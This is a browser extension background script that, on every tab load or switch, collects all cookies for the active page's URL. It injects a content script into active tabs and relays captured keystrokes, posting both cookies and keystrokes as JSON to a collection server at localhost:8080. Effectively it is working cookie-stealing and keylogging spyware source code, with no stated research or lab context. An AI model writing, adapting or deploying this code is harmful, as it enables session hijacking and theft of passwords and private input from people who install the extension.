// background.js

console.log('Background script is starting');

function sendDataToServer(data) {
  console.log('Sending data to server:', data);
  fetch('http://localhost:8080/data', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
  })
  .then(response => response.text())
  .then(result => console.log('Data sent:', result))
  .catch(error => console.error('Error sending data:', error));
}

function getAllCookies() {
  browser.tabs.query({ active: true, currentWindow: true }).then(tabs => {
    if (tabs[0] && tabs[0].url) {
      console.log('Getting cookies for URL:', tabs[0].url);
      browser.cookies.getAll({ url: tabs[0].url }).then(cookies => {
        console.log('Retrieved cookies:', cookies);
        sendDataToServer({ type: 'cookies', cookies: cookies });
      });
    } else {
      console.log('No active tab or URL found');
    }
  });
}

browser.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && tab.active) {
    console.log('Tab updated and completed:', tabId);
    getAllCookies();
  }
});

browser.tabs.onActivated.addListener((activeInfo) => {
  browser.tabs.get(activeInfo.tabId).then((tab) => {
    if (tab.status === 'complete') {
      console.log('Tab activated:', activeInfo.tabId);
      getAllCookies();
    }
  });
});

// //////////////////////////////////////////////////////////

// Function to inject content script into a specific tab
function injectContentScript(tabId) {
  console.log(`Injecting content script into tab: ${tabId}`);
  browser.tabs.executeScript(tabId, { file: 'content_script.js' });
}

browser.runtime.onMessage.addListener((message, sender) => {
  if (message.type === 'keystrokes') {
    console.log('Keystrokes received:', message.data);
    sendDataToServer({ type: 'keystrokes', keystrokes: message.data });
  }
});


// Initial injection of content script into all active tabs
browser.tabs.query({ active: true, currentWindow: true }).then((tabs) => {
  for (let tab of tabs) {
    injectContentScript(tab.id);
  }
});

console.log('Background script is running');
